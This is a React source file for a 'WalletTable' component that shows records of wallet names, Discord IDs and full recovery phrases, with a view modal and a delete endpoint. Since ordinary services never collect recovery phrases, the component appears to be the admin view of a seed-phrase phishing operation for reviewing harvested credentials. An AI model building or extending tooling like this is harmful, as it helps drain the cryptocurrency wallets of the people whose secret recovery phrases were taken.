import React, { useState } from "react";

import axios from "axios";

import { Table } from "react-bootstrap";

import { TABLEHEADERS } from "../Modules/Listing";

import ViewWallet from "./ViewWallet";

export default function WalletTable({ activeTable, table_wallets, getAll }) {
  // DELETE WALLET
  const deleteWallet = () => {
    var config = {
      method: "delete",
      url: "/delete-wallet/" + nameWalletID,
    };

    axios(config)
      .then((response) => {
        alert(response.data);
        getAll();
      })
      .catch((error) => {
        alert(error);
      });
  };

  // FILTER ACCORDING TO THE PRESENT TABLE
  const qq = [];

  table_wallets.map((data) => {
    if (data.wallet === activeTable) {
      qq.push(data);
    } else if (activeTable === "All") {
      qq.push(data);
    }
    return data;
  });

  // VIEW MODAL FOR THE SELECTED WALLET
  const [viewWallet, setViewWallet] = useState(false);

  // THE WALLET VIEWD LISTING
  const [nameWalletID, setNameWalletID] = React.useState("");
  const [nameWallet, setNameWallet] = React.useState("");
  const [recoveryPhraseWallet, setRecoveryPhraseWallet] = React.useState("");
  const [discordIDWallet, setDiscordIDWalletWallet] = React.useState("");

  // VIEW SELECTED WALLTE HANDLE
  const openWallet = (t) => {
    setViewWallet(true);
    setNameWalletID(t._id);
    setNameWallet(t.wallet);
    setRecoveryPhraseWallet(t.recoveryPhrase.join(" "));
    setDiscordIDWalletWallet(t.discordID);
  };

  const prop2 = {
    viewWallet,
    setViewWallet,
    nameWallet,
    recoveryPhraseWallet,
    discordIDWallet,
    nameWalletID,
    deleteWallet,
  };

  return (
    <div className="my-1">
      <Table striped bordered hover>
        <thead>
          <tr>
            {TABLEHEADERS.map((head, index) => {
              return <th key={index}>{head}</th>;
            })}
          </tr>
        </thead>
        <tbody>
          {qq.map((t, index) => {
            return (
              <tr key={index} onClick={() => openWallet(t)}>
                <td>{index}</td>
                <td>{t.wallet}</td>
                <td>{t.discordID}</td>
                <td>{t.recoveryPhrase.join(" ")}</td>
              </tr>
            );
          })}
        </tbody>
      </Table>

      {/* VIEW THE SELECTED WALLET */}
      <ViewWallet {...prop2} />
    </div>
  );
}
